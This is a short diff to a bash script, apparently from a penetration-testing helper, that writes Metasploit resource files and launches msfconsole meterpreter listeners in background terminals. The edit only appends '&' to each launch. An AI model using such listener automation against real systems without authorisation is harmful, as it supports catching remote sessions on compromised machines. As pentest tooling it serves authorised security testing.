@@ -317,7 +317,7 @@ do
             echo set ExitOnSession false >> ~/Desktop/temp/meterpreter1.rc
             echo exploit -j >> ~/Desktop/temp/meterpreter1.rc
             cat ~/Desktop/temp/meterpreter1.rc
-            mate-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter1.rc\""
+            mate-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter1.rc\"" &
             ;;
         "Gnome-Terminal")
         read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
@@ -329,7 +329,7 @@ do
             echo set ExitOnSession false >> ~/Desktop/temp/meterpreter2.rc
             echo exploit -j >> ~/Desktop/temp/meterpreter2.rc
             cat ~/Desktop/temp/meterpreter2.rc
-            gnome-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter2.rc\""
+            gnome-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter2.rc\"" &
             ;;
         "Xfce4")
         read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
@@ -341,7 +341,7 @@ do
             echo set ExitOnSession false >> ~/Desktop/temp/meterpreter3.rc
             echo exploit -j >> ~/Desktop/temp/meterpreter3.rc
             cat ~/Desktop/temp/meterpreter3.rc
-            xfce4-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter3.rc\""
+            xfce4-terminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter3.rc\"" &
             ;;
         "LXTerminal")
         read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
@@ -353,7 +353,7 @@ do
             echo set ExitOnSession false >> ~/Desktop/temp/meterpreter4.rc
             echo exploit -j >> ~/Desktop/temp/meterpreter4.rc
             cat ~/Desktop/temp/meterpreter4.rc
-            lxterminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter4.rc\""
+            lxterminal -e "bash -c \"msfconsole -q -r ~/Desktop/temp/meterpreter4.rc\"" &
             ;;
         "Main Menu")
             ~/ATAT/ATAT.sh
